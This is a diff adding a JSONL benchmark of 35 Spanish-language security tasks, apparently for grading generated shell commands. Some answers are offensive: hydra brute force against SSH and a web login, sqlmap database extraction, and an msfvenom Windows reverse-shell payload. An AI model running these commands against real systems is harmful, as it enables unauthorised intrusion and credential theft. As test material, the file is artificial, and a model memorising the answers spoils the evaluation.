@@ -1,0 +1,35 @@
+{"id": "b3_000", "question": "Escanea los puertos abiertos en 192.168.1.1 con detección de versión", "expected_command": "nmap -sV 192.168.1.1", "tool": "nmap"}
+{"id": "b3_001", "question": "Descubre hosts activos en la subred 10.0.0.0/24", "expected_command": "nmap -sn 10.0.0.0/24", "tool": "nmap"}
+{"id": "b3_002", "question": "Escanea con scripts de vulnerabilidades el host 10.10.10.5", "expected_command": "nmap --script vuln 10.10.10.5", "tool": "nmap"}
+{"id": "b3_003", "question": "Escaneo sigiloso SYN al host 192.168.1.100", "expected_command": "nmap -sS 192.168.1.100", "tool": "nmap"}
+{"id": "b3_004", "question": "Detecta el sistema operativo de 10.0.0.1", "expected_command": "nmap -O 10.0.0.1", "tool": "nmap"}
+{"id": "b3_005", "question": "Rompe el hash MD5 'abc123...' con wordlist rockyou.txt", "expected_command": "hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt", "tool": "hashcat"}
+{"id": "b3_006", "question": "Ataque de fuerza bruta a hash SHA256 con máscara ?a?a?a?a?a?a?a?a", "expected_command": "hashcat -m 1400 -a 3 hash.txt ?a?a?a?a?a?a?a?a", "tool": "hashcat"}
+{"id": "b3_007", "question": "Fuerza bruta SSH al host 10.0.0.1 usuario admin con rockyou.txt", "expected_command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1", "tool": "hydra"}
+{"id": "b3_008", "question": "Ataque de diccionario a formulario web login en 192.168.1.10", "expected_command": "hydra -l admin -P passwords.txt 192.168.1.10 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'", "tool": "hydra"}
+{"id": "b3_009", "question": "Enumera directorios en http://target.com con wordlist common.txt", "expected_command": "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt", "tool": "gobuster"}
+{"id": "b3_010", "question": "Busca subdominios de target.com con gobuster", "expected_command": "gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt", "tool": "gobuster"}
+{"id": "b3_011", "question": "Detecta inyección SQL en http://site.com/page?id=1", "expected_command": "sqlmap -u 'http://site.com/page?id=1' --batch", "tool": "sqlmap"}
+{"id": "b3_012", "question": "Extrae todas las bases de datos del sitio vulnerable", "expected_command": "sqlmap -u 'http://site.com/page?id=1' --batch --dbs", "tool": "sqlmap"}
+{"id": "b3_013", "question": "Busca exploits de EternalBlue en Metasploit", "expected_command": "msfconsole -q -x 'search eternalblue'", "tool": "msfconsole"}
+{"id": "b3_014", "question": "Genera payload reverse shell Windows exe con msfvenom", "expected_command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe", "tool": "msfvenom"}
+{"id": "b3_015", "question": "Captura tráfico HTTP en interfaz eth0", "expected_command": "tcpdump -i eth0 port 80 -w capture.pcap", "tool": "tcpdump"}
+{"id": "b3_016", "question": "Muestra tráfico DNS en tiempo real", "expected_command": "tcpdump -i eth0 -n port 53", "tool": "tcpdump"}
+{"id": "b3_017", "question": "Verifica el certificado SSL de google.com", "expected_command": "openssl s_client -connect google.com:443 -showcerts", "tool": "openssl"}
+{"id": "b3_018", "question": "Genera un hash SHA256 del archivo malware.exe", "expected_command": "openssl dgst -sha256 malware.exe", "tool": "openssl"}
+{"id": "b3_019", "question": "Descarga el archivo de forma silenciosa desde una URL", "expected_command": "wget -q https://example.com/file.tar.gz -O /tmp/file.tar.gz", "tool": "wget"}
+{"id": "b3_020", "question": "Verifica si un servidor responde a peticiones HTTP", "expected_command": "curl -sI https://target.com | head -5", "tool": "curl"}
+{"id": "b3_021", "question": "Extrae todas las IPs únicas del archivo access.log", "expected_command": "grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' access.log | sort -u", "tool": "grep"}
+{"id": "b3_022", "question": "Cuenta intentos de login fallidos por IP en auth.log", "expected_command": "grep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn", "tool": "grep"}
+{"id": "b3_023", "question": "Busca archivos modificados en las últimas 2 horas en /etc", "expected_command": "find /etc -mmin -120 -type f 2>/dev/null", "tool": "find"}
+{"id": "b3_024", "question": "Encuentra binarios con permiso SUID en el sistema", "expected_command": "find / -perm -4000 -type f 2>/dev/null", "tool": "find"}
+{"id": "b3_025", "question": "Muestra todas las conexiones TCP establecidas", "expected_command": "ss -tnp state established", "tool": "ss"}
+{"id": "b3_026", "question": "Lista puertos en escucha con el proceso asociado", "expected_command": "ss -tulnp", "tool": "ss"}
+{"id": "b3_027", "question": "Rompe hashes en hashes.txt con wordlist rockyou.txt usando John", "expected_command": "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt", "tool": "john"}
+{"id": "b3_028", "question": "Lista procesos de un volcado de memoria con Volatility3", "expected_command": "python3 vol.py -f memory.dmp windows.pslist", "tool": "python3"}
+{"id": "b3_029", "question": "Extrae artefactos de red de volcado de memoria", "expected_command": "python3 vol.py -f memory.dmp windows.netstat", "tool": "python3"}
+{"id": "b3_030", "question": "Bloquea tráfico entrante de la IP 192.168.1.105", "expected_command": "iptables -A INPUT -s 192.168.1.105 -j DROP", "tool": "iptables"}
+{"id": "b3_031", "question": "Permite tráfico SSH solo desde 10.0.0.0/24", "expected_command": "iptables -A INPUT -p tcp --dport 22 -s 10.0.0.0/24 -j ACCEPT", "tool": "iptables"}
+{"id": "b3_032", "question": "Calcula el hash SHA256 de un archivo", "expected_command": "sha256sum archivo.bin", "tool": "sha256sum"}
+{"id": "b3_033", "question": "Descomprime un archivo tar.gz", "expected_command": "tar -xzf archivo.tar.gz", "tool": "tar"}
+{"id": "b3_034", "question": "Muestra los últimos 100 eventos del sistema en syslog", "expected_command": "tail -100 /var/log/syslog", "tool": "tail"}
